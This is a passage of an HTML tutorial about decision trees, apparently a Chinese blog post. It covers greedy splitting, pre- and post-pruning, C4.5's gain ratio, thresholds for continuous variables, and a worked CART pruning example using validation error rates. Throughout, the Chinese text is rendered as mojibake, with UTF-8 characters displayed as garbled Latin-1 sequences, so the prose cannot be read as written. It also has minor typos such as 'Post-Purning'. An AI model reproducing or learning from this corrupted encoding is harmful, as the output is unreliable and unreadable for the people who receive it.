<li>å¯¹æ¯ä¸ªå­é›†é€’å½’åœ°é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°æ»¡è¶³åœæ­¢æ¡ä»¶ï¼ˆå¦‚è¾¾åˆ°æœ€å¤§æ·±åº¦ã€èŠ‚ç‚¹æ ·æœ¬æ•°ä½äºé˜ˆå€¼ç­‰ï¼‰</li>
</ol>
<p>è¿™ç§æ–¹æ³•è¢«ç§°ä¸º"å±€éƒ¨æœ€ä¼˜"ï¼ˆLocally Optimalï¼‰ï¼Œå› ä¸ºå®ƒåªå…³æ³¨å½“å‰æ­¥éª¤çš„æœ€ä½³å†³ç­–ï¼Œè€Œä¸è€ƒè™‘å…¨å±€æœ€ä¼˜ï¼ˆGlobally Optimalï¼‰çš„è§£å†³æ–¹æ¡ˆã€‚è™½ç„¶è¿™ç§ç­–ç•¥å¯èƒ½å¯¼è‡´æœ€ç»ˆçš„å†³ç­–æ ‘ä¸æ˜¯ç†è®ºä¸Šæœ€ä¼˜çš„ï¼Œä½†å®ƒå…·æœ‰ä»¥ä¸‹æ˜¾è‘—ä¼˜åŠ¿ï¼š</p>
<ul>
<li>è®¡ç®—æ•ˆç‡é«˜ï¼šé¿å…äº†ç©·ä¸¾æ‰€æœ‰å¯èƒ½çš„æ ‘ç»“æ„</li>
<li>å®ç°ç®€å•ï¼šç®—æ³•é€»è¾‘æ¸…æ™°ï¼Œæ˜“äºç†è§£å’Œå®ç°</li>
<li>å®é™…æ•ˆæœå¥½ï¼šåœ¨å¤§å¤šæ•°å®é™…åº”ç”¨åœºæ™¯ä¸­ä»èƒ½è·å¾—è‰¯å¥½çš„é¢„æµ‹æ€§èƒ½</li>
</ul>
<p>ä¾‹å¦‚ï¼Œåœ¨ID3ã€C4.5å’ŒCARTç­‰ç»å…¸å†³ç­–æ ‘ç®—æ³•ä¸­ï¼Œéƒ½é‡‡ç”¨äº†è¿™ç§è´ªå¿ƒç­–ç•¥ã€‚è™½ç„¶ç†è®ºä¸Šå­˜åœ¨å¯èƒ½æ‰¾åˆ°æ›´ä¼˜æ ‘çš„ç®—æ³•ï¼ˆå¦‚åŠ¨æ€è§„åˆ’ï¼‰ï¼Œä½†ç”±äºå†³ç­–æ ‘æ„å»ºé—®é¢˜çš„ç»„åˆçˆ†ç‚¸ç‰¹æ€§ï¼Œè¿™äº›æ–¹æ³•é€šå¸¸è®¡ç®—å¤æ‚åº¦å¤ªé«˜ï¼Œä¸é€‚åˆå¤„ç†å®é™…è§„æ¨¡çš„æ•°æ®é›†ã€‚</p>
<h2 data-id="heading-3">å‰ªæ</h2>
<p>å‰ªææ˜¯ä¸€ç§ç”¨äºé˜²æ­¢å†³ç­–æ ‘è¿‡æ‹Ÿåˆçš„æ–¹æ³•ã€‚åœ¨å†³ç­–æ ‘çš„æ„å»ºè¿‡ç¨‹ä¸­ï¼Œè¿‡åº¦çš„åˆ†è£‚ä¼šå¯¼è‡´æ¨¡å‹å¯¹è®­ç»ƒæ•°æ®è¿‡åº¦æ‹Ÿåˆï¼Œè¿›è€Œé™ä½å¯¹æ–°æ•°æ®çš„æ³›åŒ–èƒ½åŠ›ã€‚å‰ªæçš„ç›®çš„æ˜¯é€šè¿‡å»é™¤ä¸€äº›ä¸å¿…è¦çš„åˆ†æ”¯ï¼Œç®€åŒ–å†³ç­–æ ‘ç»“æ„ï¼Œä»è€Œæå‡æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚å¸¸è§çš„å‰ªææ–¹æ³•æœ‰é¢„å‰ªæï¼ˆpre-pruningï¼‰å’Œåå‰ªæï¼ˆpost-pruningï¼‰ã€‚é¢„å‰ªæåœ¨æ„å»ºå†³ç­–æ ‘æ—¶æå‰åœæ­¢æŸäº›åˆ†è£‚ï¼Œè€Œåå‰ªæåˆ™æ˜¯åœ¨æ ‘æ„å»ºå®Œæˆåå†å»æ‰ä¸€äº›ä¸é‡è¦çš„åˆ†æ”¯ã€‚</p>
<h2 data-id="heading-4">åˆ†è£‚</h2>
<p>åˆ†è£‚æ˜¯å†³ç­–æ ‘æ„å»ºä¸­çš„ä¸€ä¸ªæ ¸å¿ƒè¿‡ç¨‹ï¼ŒæŒ‡çš„æ˜¯ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ ¹æ®æŸä¸ªç‰¹å¾çš„å€¼ï¼Œå°†æ•°æ®åˆ’åˆ†åˆ°ä¸åŒçš„å­èŠ‚ç‚¹ä¸­ã€‚é€šè¿‡ä¸æ–­åœ°åˆ†è£‚ï¼Œå†³ç­–æ ‘é€æ¸å°†æ•°æ®é›†åˆ’åˆ†æˆæ›´å°çš„å­é›†ï¼Œä½¿å¾—æ¯ä¸ªå­é›†å†…éƒ¨çš„æ ·æœ¬æ›´å…·ä¸€è‡´æ€§ã€‚åœ¨åˆ†ç±»ä»»åŠ¡ä¸­ï¼Œåˆ†è£‚çš„ç›®æ ‡æ˜¯æœ€å¤§åŒ–ä¿¡æ¯å¢ç›Šæˆ–åŸºå°¼ç³»æ•°çš„å˜åŒ–ï¼Œåœ¨å›å½’ä»»åŠ¡ä¸­åˆ™å¸¸é‡‡ç”¨å‡æ–¹è¯¯å·®æˆ–æ–¹å·®ä½œä¸ºæŒ‡æ ‡ã€‚åˆ†è£‚çš„è¿‡ç¨‹ç›´åˆ°è¾¾åˆ°è®¾å®šçš„åœæ­¢æ¡ä»¶ï¼ˆå¦‚èŠ‚ç‚¹çº¯åº¦ã€æ ‘çš„æ·±åº¦é™åˆ¶ç­‰ï¼‰æ‰ä¼šåœæ­¢ã€‚</p>
<h2 data-id="heading-5">äºŒå‰åˆ†è£‚</h2>
<p>äºŒå‰åˆ†è£‚æ˜¯ä¸€ç§ç‰¹å®šçš„åˆ†è£‚æ–¹å¼ï¼Œæ¯æ¬¡åªå°†èŠ‚ç‚¹åˆ†æˆä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œå½¢æˆä¸€ä¸ªäºŒå‰æ ‘ç»“æ„ã€‚å†³ç­–æ ‘å¯ä»¥é€šè¿‡äºŒå‰åˆ†è£‚çš„æ–¹å¼æ„å»ºï¼Œå…¶ä¸­æ¯æ¬¡åˆ†è£‚æ—¶ï¼Œå°†æ ·æœ¬æ•°æ®åˆ†æˆä¸¤ä¸ªäº’æ–¥çš„å­é›†ã€‚è¿™ç§åˆ†è£‚æ–¹å¼çš„ä¼˜ç‚¹æ˜¯ç»“æ„ç®€å•ï¼Œä¸”åœ¨å¾ˆå¤šå®ç°ä¸­æ•ˆç‡è¾ƒé«˜ã€‚è®¸å¤šå†³ç­–æ ‘ç®—æ³•ï¼ˆå¦‚CARTç®—æ³•ï¼‰å°±æ˜¯åŸºäºäºŒå‰åˆ†è£‚æ„å»ºçš„ã€‚è¿™ç§ç»“æ„çš„å†³ç­–æ ‘åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šåªèƒ½æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œå³ã€Œæ˜¯ã€æˆ–ã€Œå¦ã€ï¼Œä»è€Œç¡®ä¿æ ‘ç»“æ„çš„ç®€æ´æ€§ã€‚</p>
<h2 data-id="heading-6">ä¿®æ”¹å±€éƒ¨æœ€ä¼˜æ¡ä»¶</h2>
<ul>
<li>ä»¥ä¿¡æ¯å¢ç›Šä½œä¸ºåˆ’åˆ†è®­ç»ƒæ•°æ®é›†çš„ç‰¹å¾ï¼Œå­˜åœ¨åå‘äºé€‰æ‹©å–å€¼è¾ƒå¤šçš„ç‰¹å¾çš„é—®é¢˜ã€‚</li>
<li>ä½¿ç”¨ä¿¡æ¯å¢ç›Šæ¯”ï¼ˆinformation gain ratioï¼‰å¯ä»¥å¯¹è¿™ä¸€é—®é¢˜è¿›è¡ŒçŸ«æ­£</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/903d6150cc9a4c13926cb4d915de437b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=%2FCUCpptviQfdSgCxDNoZC2rCFtQ%3D" alt="ä¿®æ”¹å±€éƒ¨æœ€ä¼˜æ¡ä»¶" loading="lazy"/>
ç§°ä¸ºå±æ€§ a çš„â€œå›ºæœ‰å€¼â€ï¼ˆintrinsic valueï¼‰
å±æ€§ a çš„å¯èƒ½å–å€¼è¶Šå¤šï¼ˆå³ V è¶Šå¤§ï¼‰ï¼Œåˆ™ IVï¼ˆaï¼‰çš„å€¼é€šå¸¸ä¼šè¶Šå¤§ã€‚
IV å€¼ä¼šéšç€å¶èŠ‚ç‚¹ä¸Šæ ·æœ¬é‡çš„å˜å°è€Œé€æ¸å˜å¤§ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªç‰¹å¾ä¸­å¦‚æœæ ‡ç­¾åˆ†ç±»å¤ªå¤šï¼Œæ¯ä¸ªå¶å­ä¸Šçš„ IV å€¼å°±ä¼šéå¸¸å¤§ã€‚
å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¢ç›Šç‡å‡†åˆ™å¯¹å¯å–å€¼æ•°ç›®è¾ƒå°‘çš„å±æ€§æœ‰æ‰€åå¥½ï¼Œå› æ­¤ï¼ŒC4.5 ç®—æ³•å¹¶ä¸æ˜¯ç›´æ¥é€‰æ‹©å¢ç›Šç‡æœ€å¤§çš„å€™é€‰åˆ’åˆ†å±æ€§ï¼Œè€Œæ˜¯ä½¿ç”¨äº†ä¸€ç§å¯å‘å¼ï¼šå…ˆä»å€™é€‰åˆ’åˆ†å±æ€§ä¸­æ‰¾å‡ºä¿¡æ¯å¢ç›Šé«˜äºå¹³å‡æ°´å¹³çš„å±æ€§ï¼Œå†ä»ä¸­é€‰æ‹©å¢ç›Šç‡æœ€é«˜çš„ã€‚</p>
<h2 data-id="heading-7">è¿ç»­å˜é‡å¤„ç†æ‰‹æ®µ</h2>
<p>åœ¨ C4.5 ä¸­ï¼ŒåŒæ ·è¿˜å¢åŠ äº†é’ˆå¯¹è¿ç»­å˜é‡çš„å¤„ç†æ‰‹æ®µã€‚å¦‚æœè¾“å…¥ç‰¹å¾å­—æ®µæ˜¯è¿ç»­å‹å˜é‡ï¼Œåˆ™ç®—æ³•é¦–å…ˆä¼šå¯¹è¿™ä¸€åˆ—æ•°è¿›è¡Œä»å°åˆ°å¤§çš„æ’åºï¼Œç„¶åé€‰å–ç›¸é‚»çš„ä¸¤ä¸ªæ•°çš„ä¸­é—´æ•°ä½œä¸ºåˆ‡åˆ†æ•°æ®é›†çš„å¤‡é€‰ç‚¹ï¼Œè‹¥ä¸€ä¸ªè¿ç»­å˜é‡æœ‰ N ä¸ªå€¼ï¼Œåˆ™åœ¨ C4.5 çš„å¤„ç†è¿‡ç¨‹ä¸­å°†äº§ç”Ÿ N-1 ä¸ªå¤‡é€‰åˆ‡åˆ†ç‚¹ï¼Œå¹¶ä¸”æ¯ä¸ªåˆ‡åˆ†ç‚¹éƒ½ä»£è¡¨ç€ä¸€ç§äºŒå‰æ ‘çš„åˆ‡åˆ†æ–¹æ¡ˆï¼Œä¾‹å¦‚ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad0c6431e0cd4c27957b13288fa617e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=uD06e6dwmJu8lLDYPYInLWtB%2F%2B4%3D" alt="è¿ç»­å˜é‡å¤„ç†æ‰‹æ®µ" loading="lazy"/>
è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶è¿ç»­å˜é‡çš„å¤„ç†å¹¶éæ˜¯å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªæ‹¥æœ‰ N-1 ä¸ªåˆ†ç±»æ°´å¹³çš„åˆ†ç±»å˜é‡ï¼Œè€Œæ˜¯å°†å…¶è½¬æ¢ä¸ºäº† N-1 ä¸ªäºŒåˆ†æ–¹æ¡ˆï¼Œè€Œåœ¨è¿›è¡Œäº†ä¸‹ä¸€æ¬¡çš„åˆ‡åˆ†è¿‡ç¨‹ä¸­ï¼Œåœ¨ N-1 ä¸ªæ–¹æ¡ˆéƒ½è¦å•ç‹¬å¸¦å…¥è€ƒè™‘ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªåˆ‡åˆ†æ–¹æ¡ˆå’Œä¸€ä¸ªç¦»æ•£å˜é‡çš„åœ°ä½å‡ç›¸åŒï¼ˆä¸€ä¸ªç¦»æ•£å˜é‡å°±æ˜¯ä¸€ä¸ªå•ç‹¬çš„å¤šè·¯åˆ‡åˆ†æ–¹æ¡ˆï¼‰ã€‚
ä¾‹å¦‚å¦‚ä¸‹æ•°æ®é›†ï¼Œæ•°æ®é›†ä¸­çš„åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œç¬¬ä¸€è¡Œä»£è¡¨å¹´é¾„ï¼Œæ˜¯ç‰¹å¾å˜é‡ï¼Œç¬¬äºŒè¡Œä»£è¡¨æ€§åˆ«ï¼Œæ˜¯ç›®æ ‡å­—æ®µï¼Œåˆ™å¯¹å¹´é¾„è¿™ä¸€è¿ç»­å˜é‡çš„åˆ‡åˆ†æ–¹æ¡ˆå¦‚å›¾æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74674d38e4594c23953a17c4dc829b19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=Uyj6yrNzSyfr%2B8eS%2FyQVOJOfhYs%3D" alt="è¿ç»­å˜é‡å¤„ç†æ‰‹æ®µ" loading="lazy"/>
ä»ä¸Šè¿°èƒ½å¤Ÿçœ‹å‡ºï¼Œåœ¨å¯¹äºåŒ…å«è¿ç»­å˜é‡çš„æ•°æ®é›†è¿›è¡Œæ ‘æ¨¡å‹æ„å»ºçš„è¿‡ç¨‹ä¸­è¦æ¶ˆè€—æ›´å¤šçš„è¿ç®—èµ„æºã€‚ä½†ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿä¼šå‘ç°ï¼Œå½“è¿ç»­å˜é‡çš„æŸä¸­é—´ç‚¹å‚ä¸åˆ°å†³ç­–çš„äºŒåˆ†è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€ä»£è¡¨è¯¥ç‚¹å¯¹äºæœ€ç»ˆåˆ†ç±»ç»“æœæœ‰è¾ƒå¤§å½±å“ï¼Œè¿™ä¹Ÿä¸ºæˆ‘ä»¬è¿ç»­å˜é‡çš„åˆ†ç®±å‹ç¼©æä¾›äº†æŒ‡å¯¼æ€§æ„è§ã€‚</p>
<p>ä¾‹å¦‚ä¸Šè¿°æ¡ˆä¾‹ï¼Œè‹¥è¦å¯¹ Age åˆ—è¿›è¡Œå‹ç¼©ï¼Œåˆ™å¯è€ƒè™‘ä½¿ç”¨ 36.5 å¯¹å…¶è¿›è¡Œåˆ†ç®±ï¼Œåˆ™åˆ†ç®±ç»“æœå¯¹äºæ€§åˆ«è¿™ä¸€ç›®æ ‡å­—æ®µä»ç„¶å…·æœ‰è¾ƒå¥½çš„åˆ†ç±»æ•ˆæœï¼Œè¿™ä¹Ÿæ˜¯å†³ç­–æ ‘æœ€å¸¸è§çš„ç”¨é€”ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„æ¨¡å‹æŒ‡å¯¼åˆ†ç®±çš„æ–¹æ³•ã€‚</p>
<h2 data-id="heading-8">å†³ç­–æ ‘çš„æ‹Ÿåˆåº¦ä¼˜åŒ–</h2>
<p>åœ¨å®é™…æ“ä½œä¸­ï¼Œæˆ‘ä»¬åˆ¤æ–­æ¨¡å‹çš„æ˜¯å¦æ‹Ÿåˆå¾€å¾€æ˜¯ä»æ¨¡å‹è®­ç»ƒè¯¯å·®å’Œæ³›åŒ–è¯¯å·®ï¼ŒäºŒè€…ç»“åˆä½¿ç”¨å°±èƒ½åˆ¤æ–­æ¨¡å‹æ˜¯å¦å­˜åœ¨è¿‡æ‹Ÿåˆç°è±¡ã€‚è™½ç„¶æˆ‘ä»¬ä¹‹å‰ä¸¾ä¾‹æ—¶å¹¶æ²¡æœ‰å¯¹æ•°æ®é›†è¿›è¡Œåˆ‡åˆ†ï¼Œä½†ä»»ä½•æœ‰ç›‘ç£å­¦ä¹ ç®—æ³•å»ºæ¨¡è¿‡ç¨‹ä¸­éƒ½éœ€è¦è¿›è¡Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„åˆ’åˆ†ï¼Œå†³ç­–æ ‘ä¹Ÿä¸ä¾‹å¤–ï¼Œè¿›è€Œæˆ‘ä»¬å¯ç”¨äº¤å‰éªŒè¯è®¡ç®—è®­ç»ƒè¯¯å·®å’Œæ³›åŒ–è¯¯å·®ï¼Œè¿›è€Œåˆ¤æ–­å†³ç­–æ ‘æ˜¯å¦å­˜åœ¨è¿‡æ‹Ÿåˆã€‚
è¿™æ˜¯ä¸€å¥—é€šç”¨çš„åˆ¤æ–­æœ‰ç›‘ç£å­¦ä¹ ç®—æ³•æ˜¯å¦è¿‡æ‹Ÿåˆçš„æ–¹æ³•ï¼ŒåŒæ—¶é€šç”¨çš„æ–¹æ³•ä¸­è¿˜æœ‰æ›´é«˜çº§çš„æ–¹æ³•ã€‚
ä½†å¯¹äºå†³ç­–æ ‘è€Œè¨€ï¼Œæœ‰ä¸€å¥—å†³ç­–æ ‘ç‹¬æœ‰çš„é˜²æ­¢è¿‡æ‹Ÿåˆçš„è§£å†³æ–¹æ¡ˆ--å‰ªæã€‚</p>
<h2 data-id="heading-9">å†³ç­–æ ‘å‰ªæ</h2>
<p>æ‰€è°“å‰ªææ˜¯æŒ‡åœ¨å†³ç­–æ ‘ä¸­å»é™¤éƒ¨åˆ†å¶èŠ‚ç‚¹ï¼Œå‰ªæï¼ˆPruningï¼‰ä¸»è¦ç”¨æ¥é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œå¯¹äºä¸€èˆ¬çš„æ•°æ®é›†å¦‚æœæ€»æ˜¯è¿½æ±‚çº¯çš„å¶èŠ‚ç‚¹ï¼Œæˆ–è€…è§‚æµ‹æ•°è¾ƒå°çš„å¶èŠ‚ç‚¹ï¼Œå¾ˆå®¹æ˜“ä½¿å¾—æ ‘è¿‡äºåºæ‚ï¼Œå°¤å…¶æ˜¯å­˜åœ¨å¯ä»¥åå¤ä½¿ç”¨çš„è¿ç»­å˜é‡çš„æ—¶å€™ï¼Œæ­¤æ—¶å°±éœ€è¦ä¸»åŠ¨å»æ‰ä¸€äº›åˆ†æ”¯æ¥é™ä½è¿‡æ‹Ÿåˆçš„é£é™©ã€‚</p>
<p>å¸¸è§çš„å‰ªæç­–ç•¥æœ‰â€œé¢„å‰ªæâ€ï¼ˆPre-Pruningï¼‰å’Œâ€œåå‰ªæâ€ï¼ˆPost-Purningï¼‰</p>
<ul>
<li>é¢„å‰ªæï¼šåœ¨å†³ç­–æ ‘ç”Ÿæˆçš„è¿‡ç¨‹ä¸­ï¼Œå¯¹æ¯ä¸ªèŠ‚ç‚¹åœ¨åˆ’åˆ†å‰å…ˆè¿›è¡Œä¼°è®¡ï¼Œå¦‚æœå½“å‰çš„èŠ‚ç‚¹åˆ’åˆ†ä¸èƒ½å¸¦æ¥å†³ç­–æ ‘æ³›åŒ–æ€§èƒ½ï¼ˆé¢„æµ‹æ€§èƒ½ï¼‰çš„æå‡ï¼Œåˆ™åœæ­¢åˆ’åˆ†å¹¶ä¸”å½“å‰èŠ‚ç‚¹æ ‡è®°ä¸ºå¶èŠ‚ç‚¹ã€‚</li>
<li>åå‰ªæï¼šå…ˆè®­ç»ƒç”Ÿæˆä¸€é¢—å®Œæ•´çš„æ ‘ï¼Œè‡ªåº•å‘ä¸Šå¯¹éå¶èŠ‚ç‚¹è¿›è¡Œè€ƒå¯Ÿï¼Œå¦‚æœè¯¥èŠ‚ç‚¹å¯¹åº”çš„å­æ ‘æ›¿æ¢ä¸ºå¶èŠ‚ç‚¹èƒ½å¸¦æ¥å†³ç­–æ ‘æ³›åŒ–èƒ½åŠ›çš„æå‡ï¼Œåˆ™è¯¥å­æ ‘æ›¿æ¢ä¸ºå¶èŠ‚ç‚¹ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e856729cd3d45959036fa2d780b81e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=zdykpwRiMMV7A5rHNBz5GKkRtkU%3D" alt="å†³ç­–æ ‘å‰ªæ" loading="lazy"/></p>
<h2 data-id="heading-10">åˆ†è£‚å‡†åˆ™</h2>
<p>äºŒå‰é€’å½’åˆ’åˆ†ï¼šæ¡ä»¶æˆç«‹å‘å·¦ï¼Œåä¹‹å‘å³</p>
<ul>
<li>å¯¹äºè¿ç»­å˜é‡ï¼šæ¡ä»¶æ˜¯å±æ€§å°äºç­‰äºæœ€ä¼˜åˆ†è£‚ç‚¹</li>
<li>å¯¹äºåˆ†ç±»å˜é‡ï¼šæ¡ä»¶æ˜¯å±æ€§å±äºè‹¥å¹²ç±»</li>
</ul>
<h2 data-id="heading-11">äºŒå‰åˆ†è£‚ä¼˜ç‚¹</h2>
<p>ç›¸æ¯”å¤šè·¯åˆ†è£‚å¯¼è‡´æ•°æ®ç¢ç‰‡åŒ–çš„é€Ÿåº¦æ…¢ï¼Œå…è®¸åœ¨ä¸€ä¸ªå±æ€§ä¸Šé‡å¤åˆ†è£‚ï¼Œå³å¯ä»¥åœ¨ä¸€ä¸ªå±æ€§ä¸Šäº§ç”Ÿè¶³å¤Ÿå¤šçš„åˆ†è£‚ã€‚ä¸¤è·¯åˆ†è£‚å¸¦æ¥çš„æ ‘é¢„æµ‹æ€§èƒ½æå‡è¶³ä»¥å¼¥è¡¥å…¶ç›¸åº”çš„æ ‘æ˜“è¯»æ€§æŸå¤±ã€‚</p>
<p>å¯¹äºå±æ€§ä¸åŒçš„è¢«é¢„æµ‹å˜é‡ Y åˆ†è£‚å‡†åˆ™ä¸åŒï¼š</p>
<ul>
<li>åˆ†ç±»æ ‘ï¼šGini å‡†åˆ™ï¼Œä¸ä¹‹å‰çš„ä¿¡æ¯å¢ç›Šå¾ˆç±»ä¼¼ï¼ŒGini ç³»æ•°åº¦é‡ä¸€ä¸ªèŠ‚ç‚¹çš„ä¸çº¯åº¦ã€‚</li>
<li>å›å½’æ ‘ï¼šä¸€ç§å¸¸è§çš„åˆ†å‰²æ ‡å‡†æ˜¯åå·®å‡å°‘ï¼ˆStand Deviation Reductionï¼ŒSDRï¼‰ï¼Œç±»ä¼¼äºæœ€å°å‡æ–¹å·® LSï¼ˆLeast Squares é¢„æµ‹é”™è¯¯çš„å¹³æ–¹å’Œï¼‰å‡†åˆ™ã€‚</li>
</ul>
<h2 data-id="heading-12">åˆ©ç”¨æµ‹è¯•é›†è¿›è¡Œå‰ªæ</h2>
<p>ç®€å•è®¨è®º CART ç®—æ³•å‰ªæè¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹ä¹Ÿæ˜¯æµ‹è¯•é›†ç”¨äºä¿®æ­£æ¨¡å‹çš„æœ€ä½³ä½“ç°ã€‚ä¾‹å¦‚ï¼Œåœ¨å¦‚ä¸‹è®­ç»ƒé›†ä¸­è®­ç»ƒå¾—åˆ°çš„æ¨¡å‹ï¼Œé»‘è‰²æ•°å­—è¡¨ç¤ºè®­ç»ƒé›†ä¸Šçš„åˆ†ç±»æƒ…å†µï¼Œçº¢è‰²æ•°å­—è¡¨ç¤ºæ¨¡å‹ä½œç”¨äºéªŒè¯é›†ä¸Šçš„åˆ†ç±»æƒ…å†µã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a587f14cc2dd420d8b75ce380d8e279f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=slNUScYrdEmvmlkY8KjY1iHYVwg%3D" alt="åˆ©ç”¨æµ‹è¯•é›†è¿›è¡Œå‰ªæ" loading="lazy"/>
åˆ™ CART ç®—æ³•åˆ©ç”¨éªŒè¯é›†å‰ªæçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ¤æ–­æ¯ä¸ªå¶èŠ‚ç‚¹åœ¨éªŒè¯é›†ä¸Šçš„é”™è¯¯ç‡</li>
<li>èŠ‚ç‚¹ 4 çš„é”™è¯¯ç‡ï¼še(4) = 1/3</li>
<li>èŠ‚ç‚¹ 5 çš„é”™è¯¯ç‡ e(5) = 1</li>
<li>èŠ‚ç‚¹ 6 çš„é”™è¯¯ç‡ e(6) = 1</li>
<li>èŠ‚ç‚¹ 7 çš„é”™è¯¯ç‡ä¸º e(7) = 4 / 9</li>
</ul>
<p>è®¡ç®—èŠ‚ç‚¹æ€»åŠ æƒå¹³å‡é”™è¯¯ç‡å¹¶å’Œçˆ¶èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼ŒåŠ æƒæ–¹æ³•å°±æ˜¯ä¹˜ä»¥è¯¥èŠ‚ç‚¹æ ·æœ¬æ•°é‡å çˆ¶èŠ‚ç‚¹æ ·æœ¬æ€»é‡çš„ç™¾åˆ†æ¯”ï¼ˆæµ‹è¯•é›†ï¼‰ï¼š</p>
<p>å¦‚èŠ‚ç‚¹ 2 çš„é”™è¯¯ç‡ä¸º e(2)=1/4ï¼Œè€ŒèŠ‚ç‚¹ 4 å’ŒèŠ‚ç‚¹ 5 çš„åŠ æƒå¹³å‡é”™è¯¯ç‡ä¸º e(4) * 3/4 + e(5) * 1/4 = 2/4ï¼Œå› æ­¤å­èŠ‚ç‚¹é”™è¯¯ç‡æ›´é«˜ï¼Œè€ƒè™‘å‰ªæã€‚
èŠ‚ç‚¹ 3 çš„é”™è¯¯ç‡ä¸º e(3) = 4/10ï¼Œè€Œ e(6)* 1/10 + e(7)*9/10 = 5/10ï¼Œå› æ­¤è€ƒè™‘å‰ªæã€‚
èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 3 çš„åŠ æƒå¹³å‡é”™è¯¯ç‡ e(2) * 4/14 + e(3) * 10/14 =  5/14ï¼Œæ¯”çˆ¶èŠ‚ç‚¹ï¼ˆèŠ‚ç‚¹ 1ï¼‰çš„é”™è¯¯ç‡ e(1) = 7/14 è¦å°ï¼Œå› æ­¤ä¿ç•™è¯¥èŠ‚ç‚¹ï¼Œåœæ­¢å‰ªæã€‚</p>
<p>å¯ä»¥çœ‹å‡ºï¼ŒCART ç®—æ³•å‰ªæè¿‡ç¨‹æ›´æ˜“ç†è§£ä¹Ÿæ›´ä¾¿äºæ“ä½œï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°å¯¹äºå»ºç«‹æ¨¡å‹çš„ç®—æ³•è€Œè¨€ï¼Œæµ‹è¯•é›†ä¸ä»…èƒ½å¤Ÿå¯¹æ¨¡å‹å‡†ç¡®ç‡è¿›è¡Œè¯„ä¼°ï¼ŒåŒæ—¶è¿˜èƒ½èµ·åˆ°ä¿®æ­£ä¼˜åŒ–æ¨¡å‹çš„ä½œç”¨ã€‚</p>
<h2 data-id="heading-13">æµ‹è¯•é›†å’ŒéªŒè¯é›†</h2>
<p>å¯¹äºå¤§å¤šæ•°æ¨¡å‹è€Œè¨€ï¼Œæµ‹è¯•é›†å®é™…ä¸Šçš„ä½œç”¨å°±æ˜¯ç”¨æ¥ä¿®æ­£æ¨¡å‹ï¼Œä¸ºäº†æé«˜ä¿®æ­£çš„å‡†ç¡®ç‡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨äº¤å‰éªŒè¯çš„æ–¹æ³•ï¼Œåå¤åˆ¤åˆ«æ¨¡å‹ä¿®æ”¹æ¡ä»¶ï¼ˆå¦‚æ˜¯å¦è¦å‰ªæï¼‰ï¼Œå¹¶è®¾ç½®æ¨¡å‹ä¿®æ”¹å‡ºå‘æ¡ä»¶ï¼ˆå¦‚å¤šæ•°éªŒè¯æƒ…å†µéœ€è¦ä¿®æ”¹åˆ™å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼‰ï¼Œä»è€Œæé«˜æ¨¡å‹ä¼˜åŒ–çš„å¯é æ€§ã€‚</p>
<p>è€Œé™¤äº†è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å°å°ä¼šåˆ’åˆ†ä¸€ä¸ªéªŒè¯é›†ï¼ŒéªŒè¯é›†æ•°æ®ä¸å‚ä¸å»ºæ¨¡å¶ä¸å‚ä¸æ¨¡å‹ä¿®æ”¹å’Œä¼˜åŒ–ï¼Œåªç”¨äºæ¨¡å‹æœ€ç»ˆä¼˜åŒ–åçš„æ¨¡å‹æ•ˆåŠ›ã€‚</p>
